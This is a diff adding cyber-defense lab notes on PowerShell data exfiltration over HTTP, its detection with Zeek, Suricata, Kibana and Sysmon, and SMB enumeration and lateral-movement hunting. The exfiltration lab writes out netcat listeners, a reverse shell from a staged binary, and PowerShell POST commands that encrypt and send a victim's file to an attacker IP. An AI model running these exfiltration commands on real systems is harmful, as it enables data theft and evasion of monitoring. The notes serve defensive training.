@@ -4494,45 +4494,439 @@ chrome.dll
 ![image](https://github.com/user-attachments/assets/002e48b3-2034-400c-8a2c-0dab8b714738)
 
 
+-------------------------------
+
+#### CDAH-M10L1-Exfiltration Methods and Protocols ####
+
+Data Exfiltration over HTTP
+Examination of PowerShell Data Exfiltration over HTTP
+﻿
+
+Before the actual data exfiltration takes place, attackers may compress, encrypt, or encode the payload that is about to be sent to the attackers’ server. Attackers usually do this either with the backdoor or a third-party tool. This allows attackers to minimize the size of the data they are exfiltrating and obfuscate its contents to bypass network monitoring.
+
+﻿
+
+The next activity provides an example of data exfiltration using PowerShell. In it, an attacker reads the contents of a file from the local system, encrypts it with a variation of Advanced Encryption Standard (AES), and sends it to the attacker’s server through HTTP over port 80. In most cases, this approach does not raise any alarms, so attackers can use it to perform stealth exfiltration.
+
+﻿
+
+﻿
+
+Exfiltrate Data over HTTP
+﻿
+
+Use built-in PowerShell commands and Kali tools to demonstrate how an attacker may exfiltrate a file using HTTP POST requests.
+
+﻿
+
+Workflow
+﻿
+
+1. Log in to the Virtual Machine (VM) red-kali with the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open a Netcat listener in a new terminal window:
+
+(trainee@red-kali)-[~] $ nc -lvnp 5555
+﻿
+
+3. In another new terminal window, change directories to the lab folder on the desktop:
+
+(trainee@red-kali)-[~] $ cd Desktop/lab
+﻿
+
+4. Open a web service to receive data by running the following command:
+
+(trainee@red-kali)-[~/Desktop/lab] $ sudo ./webservice.py
+[sudo] password for trainee: CyberTraining1!
+﻿
+
+5. Log in to the VM ch-edu-1 as Karen Smith with the following credentials:
+
+Username: ksmith
+Password: CyberTraining1!
+﻿
+
+6. Execute the WindowsUpdate.exe executable from the desktop. This is a staged malicious binary downloaded to the desktop by the user.
 
 
 
 
+7. In the netcat listener terminal on red-kali, open a PowerShell session by entering the following command:
+
+C:\Users\ksmith\Desktop>powershell
+﻿
+
+Below, Figure 10.1-1 illustrates the results from entering this command:
+
+﻿
+![image](https://github.com/user-attachments/assets/6ccd4141-69df-48d0-b57d-8798f2509b72)
+
+
+8. Change directories to the user’s Documents folder at C:\Users\ksmith\Documents, and enter the dir command to list the files in the directory.
+
+
+There are a number of documents in this folder that an attacker may find interesting, including a security policy memorandum, a system access request, and personal information about other employees. Figure 10.1-2, below, displays this list of documents:
+
+
+![image](https://github.com/user-attachments/assets/7218eb5b-a1c0-4b81-9468-47b0e8a89b1d)
+
+9. Upload the City Educators Address Book.pdf document through HTTP POST to the web server on Kali with the following command:
+PS C:\Users\ksmith\Documents> Invoke-RestMethod -Uri http://128.0.7.205/upload.php -Method Post -Infile 'C:\Users\ksmith\Documents\City Educators Address Book.pdf'
+
+
+
+Step 9 highlights one way to exfiltrate interesting files over the HTTP protocol on port 80 of the attacker machine. However, an attacker may be more interested in preventing a defender from seeing the file upload in this apparent way. Complete the rest of this lab to employ encryption that obscures the data being sent.
+
+
+10. Stop the web service the keyboard command CTRL + c.
+
+
+11. Start a netcat listener on the standard HTTP port to send received data to a file by entering the following:
+(trainee@red-kali)-[~/Desktop/lab] $ sudo nc -lnp 80 > data
+
+
+
+NOTE: If step 11 prompts for a password, use CyberTraining1!
+
+
+In this lab, step 11 sends the encrypted data over port 80. Another common data exfiltration method is to send the data over port 443, since it mimics normal, encrypted HTTPS traffic.
+
+
+12. Change directories to the user’s Desktop folder at C:\Users\ksmith\Desktop.
+
+
+13. Create an encrypted file upload through HTTP POST messages by entering the following series of six commands in the PowerShell session:
+PS C:\Users\ksmith\Desktop>$file = Get-Content 'C:\Users\ksmith\Documents\City Educators Address Book.pdf'
+
+
+
+PS C:\Users\ksmith\Desktop>$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
+
+
+
+PS C:\Users\ksmith\Desktop>$secureString = new-object System.Security.SecureString
+
+
+
+PS C:\Users\ksmith\Desktop>foreach ($char in $file.toCharArray()) { $secureString.AppendChar($char) }
+
+
+
+PS C:\Users\ksmith\Desktop>$encryptedData = ConvertFrom-SecureString     -SecureString $secureString -Key $key
+
+
+
+PS C:\Users\ksmith\Desktop>Invoke-WebRequest -Uri http://128.0.7.205 -Method POST -Body $encryptedData
+
+
+
+14. Close the netcat process with the following keyboard interrupt. This action saves the entire encrypted payload to the data file.
+^C
+
+![image](https://github.com/user-attachments/assets/739ac11d-85d9-4987-9823-c928d204cdf8)
+
+
+-----------------------------------------------------
+
+Data Exfiltration Detection
+Detecting Data Exfiltration using Elastic Stack
+﻿
+
+Zeek logs and Suricata rules are a powerful mechanism for detecting data exfiltration when a compromise is expected in a network. Defenders must place sensors appropriately for Zeek and Suricata to effectively collect the metadata for all traffic across a network.
+
+﻿
+
+Use Elastic Stack to Detect Data Exfiltration
+﻿
+
+An analyst can find evidence of the data exfiltration performed over HTTP, and related metrics, by using the Zeek logs, Suricata alerts, and the Kibana front end to the Elastic Stack. The following activity makes these tools available in its installation of Security Onion.
+
+﻿
+
+Workflow
+﻿
+
+1. Log in to the VM win-hunt with the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open the Kibana Discover - Elastic view from the bookmark in the Chrome browser and log in with the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+3. In a new tab, open the Security Onion dashboard Zeek - Files using the Chrome bookmark.
+
+﻿
+
+This dashboard can be used to find network-based file operations across the enterprise when an attacker does not apply any obfuscation to the file upload or download.
+
+﻿
+
+4. Modify the query in the Kibana Discovery query field at the top of the page to include the address below as an Indicator of Compromise (IOC) to the team:
+
+event.dataset:file* and destination.ip: 128.0.7.205
+﻿
+
+Figure 10.1-3 illustrates this step:
+
+﻿![image](https://github.com/user-attachments/assets/fc715ca3-881d-46c0-ba7e-6b381c096335)
 
 
 
 
+The event.dataset filter may be used for other sets of interest for finding evidence of data extraction, such as http, https, dns, smtp, or others mentioned in the introduction. This IP address is of interest as an IOC due to the activities associated with the netcat listener in the previous exercise.
+
+
+5. Set the date range to the absolute range 16 February 2022 15:00:00 - 16 February 2022 16:00:00 in the timespan field, next to the calendar icon.
+
+
+6. Open the earliest record listed with the destination IP address 128.0.7.205
+
+
+This record includes the following fields of helpful information: 
+file.bytes.total: Size
+@timestamp: Time
+destination.ip: Destination IP address
+client.ip: Source IP address
+file.source: Protocol over which the file was sent or received
+hash.md5: MD5 hash
+file.mime_type: File type
+file.extracted.filename: Location of the file on the SIEM
+
+In an investigation, these details are helpful in determining if this upload is part of a coordinated attack. If this file proves to be of interest in the investigation, an extracted copy of that file is available on the SIEM server at the listed location.
+
+
+Figure 10.1-4, below, highlights the Log ID field. Filtering logs stored in Elastic Stack by this Zeek Log ID returns both this file action log entry, as well as the connection logs of the associated upload.
+
+
+![image](https://github.com/user-attachments/assets/52521759-dcf8-403f-bb5c-0871361c0d21)
+
+
+7. To view other associated logs, select the link in the log.id.uid field and update the date/time picker with 16 February 2022 15:00:00 - 16 February 2022 16:00:00 (the same time range as in step 5).
+
+
+Figure 10.1-5, below, shows the file uploaded on the Kibana Discover web interface. Based on the scenario and previous workflow, there are still logs that need to be analyzed from the PowerShell-encrypted upload. Defenders can find these events by applying filters to the Kibana Discover dashboard, as in step 9, below.
+
+
+![image](https://github.com/user-attachments/assets/b9866148-45f8-4a01-b486-ab8cec852b87)
+
+
+8. Go to the Security Onion HTTP Dashboard using the Chrome bookmark for Zeek - HTTP.
+
+
+9. Enter the following query to isolate the other logs:
+
+event.dataset:http and http.method.keyword:POST
 
 
 
+A new URI is listed in the URI section of the HTTP Dashboard. It is different from the upload.php page, where the attacker uploaded the file in plaintext.
+
+
+10. Add the base address as a filter by selecting the Add Filter button in the URI section, as highlighted in Figure 10.1-6, below:
+
+![image](https://github.com/user-attachments/assets/ba847823-5237-40ab-a37c-083cc8f5d1ae)
 
 
 
+In this case, since the netcat listener is not a functioning HTTP server, the response code is absent entirely during the data transfer, as highlighted in Figure 10.1-7, below.
+
+![image](https://github.com/user-attachments/assets/fa87e8e6-650e-4207-bc7f-4f883dfa2017)
+
+Defenders can also use Sysmon logs to discover this file action on a properly configured host. 
+
+
+Additionally, Zeek includes HTTP response codes in the field http.status_code. This information can be used to analyze the outcome of HTTP requests and responses to identify anomalies or suspicious activities during the data transfer process.
+
+
+11. Open the Security Onion - Sysmon dashboard from the Dashboard library in Kibana.
+
+
+12. Update the date/time picker with 16 February 2022 15:00:00 - 16 February 2022 16:00:00 (the same time range as in step 5).
+
+
+13. Add the following query, as displayed in Figure 10.1-8:
+event.module:sysmon and event.dataset.keyword:"network_connection" and destination.port:80
+
+![image](https://github.com/user-attachments/assets/5b87a480-be43-443b-b922-3a7708e0016e)
+
+This is a host-based way of finding HTTP actions, but using Sysmon logging instead of Zeek. Sysmon lacks the greater fidelity of information that Zeek offers through data such as specific headers and packet contents. However, a helpful crossover is available through the **Network Community ID field. Selecting this link in this field, as highlighted in Figure 10.1-9, below, shows all logs related to the entire network session. This includes logs from both Sysmon and Zeek.**
+
+![image](https://github.com/user-attachments/assets/8287a7e2-c6e9-4054-a1c9-d92c6a05d2bc)
+
+![image](https://github.com/user-attachments/assets/7d044e8f-a3b5-43ea-bc3f-9c2fc3728258)
+![image](https://github.com/user-attachments/assets/f30f089f-fff5-464e-835d-2426221dac5d)
+![image](https://github.com/user-attachments/assets/576c8e32-24db-472f-b8c4-5006f7bcf6d7)
+![image](https://github.com/user-attachments/assets/dfd9814e-731f-4bc8-9d16-74e714750657)
+![image](https://github.com/user-attachments/assets/36a47e91-efcd-4798-a59d-c6bff01c3e4f)
+
+
+---------------------------------------------------
+
+#### CDAH-M10L2-SMB Enumeration and Lateral Movement ####
+
+
+SMB Enumeration Techniques
+The CPT has been assigned to a mission to audit SMB shares. A domain account has been provided to the CPT to assist local defenders. Enumerate the SMB shares, and identify misconfigurations that an adversary may be able to take advantage of.
+
+﻿
+
+Workflow﻿
+
+﻿
+
+1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+ 
+
+2. Open a command prompt, and run the following command to enumerate the SMB shares on the Domain Controller (DC) ch-dc1: 
+
+C:\Users\trainee>net view \\ch-dc1 /ALL
+﻿
+![image](https://github.com/user-attachments/assets/cc6e921c-816a-40ff-957f-cab592184f16)
+
+3. The DC’s admin shares are enabled. Such malware as Emotet and Trickbot (botnets that exploit SMB as part of their attack chain) specifically hunt for these admin shares to attempt to exploit them for lateral movement. The NETLOGON server share is used for domain logins, which means port 445 is not blocked on this host, and SMB shares are listening for any admin connection. 
+
+
+Enter the following command to enumerate all the hosts with the admin share enabled. This command only queries hosts on a per-subnet basis, so only hosts in the same subnet as ch-tech-1 respond.
+C:\Users\trainee>net view /domain:VCCH /ALL
+
+![image](https://github.com/user-attachments/assets/beb7d336-69b9-4806-bca3-d302d7f7426f)
+
+If an attacker gained a foothold on this user machine, they could see that two other workstations are open for potential exploitation or lateral movement. If an attacker has already gained administrator credentials through other means or uses a pass-the-hash attack, they can also laterally move to those other two hosts.
+
+
+![image](https://github.com/user-attachments/assets/cab066c7-fb83-4026-b2a9-6e615e4e28b6)
+
+-----------------------
+
+SMB Enumeration: Third-Party Tools
+Adversaries use built-in OS commands when hunting for targets for lateral movement. However, for more efficient attacks, more advanced capabilities provided by custom or third-party tools are often necessary.
+
+﻿
+
+This section focuses on the third-party tool Nmap for performing SMB enumeration.
+
+﻿
+
+Nmap Overview
+﻿
+
+Nmap includes several options for enumerating SMB information on hosts. Nmap has some simple SMB tests and more in-depth SMB enumeration scripts, discussed later in this lesson.
+
+﻿
+
+The Nmap command to check whether a given host has the SMB ports open is as follows:
+
+nmap -p 139,445 [HOST.IP.ADDRESS.X]
+﻿
+
+These specific flags in the command are looking for the port status of 139 and 445 because those ports are the default listening ports for SMB.
+
+﻿
+
+In addition, Classless Inter-Domain Routing (CIDR) notation may be used to scan a range of Internet Protocol (IP) addresses to target a specific subnet. Running Nmap with a full CIDR range may take a few minutes (or hours for large scans) but is more thorough and can be useful for threat hunting. For example, in this exercise, the following command returns all the hosts that have ports 139 and 445 open:
+
+nmap -p 139,445 172.35.0.0/16
+
+![image](https://github.com/user-attachments/assets/de85cc69-6cf2-4291-aa2b-db523544df71)
+
+Many other third-party tools integrate Nmap into their network scanning, so checking for Nmap scans is a good way to find an attacker probing an environment. 
+
+![image](https://github.com/user-attachments/assets/10457af0-ac5e-45a7-b102-d8f9b8b56c2e)
+
+
+-----------------------
+
+
+Workflow
+
+
+1. Log in to the kali-hunt VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
 
 
 
+2. From the kali-hunt desktop, analyze the three scan results and answer the following questions.
+/home/trainee/Desktop/scan-scripts.txt
+/home/trainee/Desktop/nbtscan_172.35.2-4.txt
+/home/trainee/Desktop/nbtscan_172.35.2.0.txt
+
+![image](https://github.com/user-attachments/assets/46bbfe2c-bd73-42b8-92f9-aa9c1854178b)
+
+![image](https://github.com/user-attachments/assets/14d86f76-471e-4713-9e5b-de98de23eaf7)
+
+![image](https://github.com/user-attachments/assets/fde7bd81-2723-43d2-9e3e-e2e81e8bd01a)
+
+![image](https://github.com/user-attachments/assets/db914297-1cd1-4fb2-a199-627917071efc)
+
+![image](https://github.com/user-attachments/assets/b2677db1-b75d-478a-a751-ef1b6e0b9e2e)
+
+![image](https://github.com/user-attachments/assets/bf240c49-8523-4399-83ad-254ab6c694fa)
+
+![image](https://github.com/user-attachments/assets/971bb08a-f42e-409e-af84-710adc229872)
+
+![image](https://github.com/user-attachments/assets/ef3e72d8-84c4-4001-acb3-60ab89d8ab48)
 
 
+--------------------------
+
+Lateral Movement Detection
+The CPT has been tasked to investigate suspicious traffic on the VCCH network. A suspected threat actor may have used SMB shares to distribute files throughout a network for lateral movement. Local defenders noticed suspicious traffic on their network on Monday, February 14, 2022 between 00:00 and 06:00. The user account merlin.sweeney reported unspecified unusual activity on their workstation. In addition, a new, unidentified host briefly appeared in the logs prior to the suspected compromise. The rogue device’s IP address was 172.35.11.6. A domain account has been provided to the CPT for this exercise in order to investigate hosts within the network from the DC ch-dc1.
 
 
+﻿
 
+Workflow﻿
 
+﻿
 
+1. Log in to the win-hunt VM using the following credentials:
 
+Username: trainee
+Password: CyberTraining1!
+﻿
 
+2. Select the Discover - Elastic bookmark in Chrome, and log in using the following credentials:
 
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
 
+3. Perform an investigation in the network using the time period Feb 14, 2022 @ 00:00:00.000 – Feb 14, 2022 @ 06:00:00.000 for SMB enumeration or activity from the merlin.sweeney user account.
 
+﻿
 
+4. Use Elastic and the following domain credentials to identify any Indicators of Compromise (IOC) associated with the merlin.sweeney account in the VCCH network:
 
+Username: trainee
+Password: CyberTraining1!
+﻿
+![image](https://github.com/user-attachments/assets/5c09063d-02d4-4eca-8f70-19599a3003f1)
 
+![image](https://github.com/user-attachments/assets/f25f5020-bc3a-432c-a89a-58c67c0cebea)
 
+![image](https://github.com/user-attachments/assets/10ebce61-a092-4736-844f-6c94e1ea5683)
 
+![image](https://github.com/user-attachments/assets/b380fc7b-91f2-4577-8de4-299560391c5c)
 
+![image](https://github.com/user-attachments/assets/1088049d-ec58-4836-9a43-e35b02a6efae)
 
+![image](https://github.com/user-attachments/assets/7b249ee9-78f2-4e91-aa5a-c421b57ae32a)
 
-
-
+------------------
 
 
 
